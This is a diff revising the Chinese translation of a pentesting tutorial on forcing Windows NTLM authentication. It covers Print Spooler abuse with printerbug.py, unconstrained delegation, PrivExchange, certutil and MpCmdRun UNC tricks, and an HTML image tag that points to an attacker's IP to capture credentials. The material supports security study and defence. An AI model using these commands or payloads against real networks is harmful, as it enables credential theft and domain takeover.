@@ -8,18 +8,18 @@
 
 ## Spooler 服务滥用
 
-如果 _**Print Spooler**_ 服务 **启用，** 您可以使用一些已知的 AD 凭据 **请求** 域控制器的打印服务器更新新打印作业，并告诉它 **将通知发送到某个系统**。\
+如果 _**Print Spooler**_ 服务 **启用，** 您可以使用一些已知的 AD 凭据向域控制器的打印服务器 **请求** 新打印作业的 **更新**，并告诉它 **将通知发送到某个系统**。\
 请注意，当打印机将通知发送到任意系统时，它需要 **对该系统进行认证**。因此，攻击者可以使 _**Print Spooler**_ 服务对任意系统进行认证，并且该服务将在此认证中 **使用计算机账户**。
 
 ### 在域中查找 Windows 服务器
 
-使用 PowerShell，获取 Windows 机器的列表。服务器通常是优先考虑的，因此我们将重点放在这里：
+使用 PowerShell 获取 Windows 计算机的列表。服务器通常是优先考虑的，因此我们将重点放在这里：
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
 ### 查找监听的Spooler服务
 
-使用稍微修改过的@mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看Spooler服务是否在监听：
+使用稍微修改过的@mysmartlogin（Vincent Le Toux）的[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看Spooler服务是否在监听：
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### 结合不受限制的委托
 
-如果攻击者已经攻陷了一台具有 [Unconstrained Delegation](unconstrained-delegation.md) 的计算机，攻击者可以 **使打印机对该计算机进行身份验证**。由于不受限制的委托，**打印机的计算机帐户的 TGT** 将 **保存在** 具有不受限制委托的计算机的 **内存** 中。由于攻击者已经攻陷了该主机，他将能够 **检索此票证** 并加以利用 ([Pass the Ticket](pass-the-ticket.md))。
+如果攻击者已经攻陷了一台具有 [不受限制的委托](unconstrained-delegation.md) 的计算机，攻击者可以**使打印机对该计算机进行身份验证**。由于不受限制的委托，**打印机的计算机帐户的 TGT** 将被**保存在**具有不受限制委托的计算机的**内存**中。由于攻击者已经攻陷了该主机，他将能够**检索此票证**并加以利用（[Pass the Ticket](pass-the-ticket.md)）。
 
 ## RCP 强制身份验证
 
@@ -49,13 +49,13 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ## PrivExchange
 
-`PrivExchange` 攻击是由于 **Exchange Server `PushSubscription` 功能** 中发现的缺陷。该功能允许任何具有邮箱的域用户强制 Exchange 服务器通过 HTTP 对任何客户端提供的主机进行身份验证。
+`PrivExchange` 攻击是由于在 **Exchange Server `PushSubscription` 功能** 中发现的缺陷。该功能允许任何具有邮箱的域用户强制 Exchange 服务器通过 HTTP 对任何客户端提供的主机进行身份验证。
 
-默认情况下，**Exchange 服务以 SYSTEM 身份运行**，并被赋予过多的权限（具体来说，它在 2019 年之前的累积更新上具有 **WriteDacl 权限**）。此缺陷可以被利用以启用 **向 LDAP 中转信息并随后提取域 NTDS 数据库**。在无法向 LDAP 中转的情况下，此缺陷仍然可以用于在域内中转和对其他主机进行身份验证。成功利用此攻击将立即授予任何经过身份验证的域用户帐户对域管理员的访问权限。
+默认情况下，**Exchange 服务以 SYSTEM 身份运行**，并被赋予过多的权限（具体来说，它在域的 2019 年之前的累积更新上具有 **WriteDacl 权限**）。此缺陷可被利用以启用**向 LDAP 中转信息并随后提取域 NTDS 数据库**。在无法向 LDAP 中转的情况下，此缺陷仍可用于在域内对其他主机进行中转和身份验证。成功利用此攻击将立即授予任何经过身份验证的域用户帐户对域管理员的访问权限。
 
 ## 在 Windows 内部
 
-如果您已经在 Windows 机器内部，可以使用以下命令强制 Windows 使用特权帐户连接到服务器：
+如果您已经在 Windows 机器内部，可以使用特权帐户强制 Windows 连接到服务器，方法是：
 
 ### Defender MpCmdRun
 ```bash
@@ -88,7 +88,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### 通过电子邮件
 
-如果您知道要攻击的机器上登录用户的 **电子邮件地址**，您可以直接向他发送一封 **带有 1x1 图像** 的电子邮件，例如
+如果你知道想要攻陷的机器上用户的 **电子邮件地址**，你可以给他发送一封 **带有 1x1 图像** 的电子邮件，例如
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
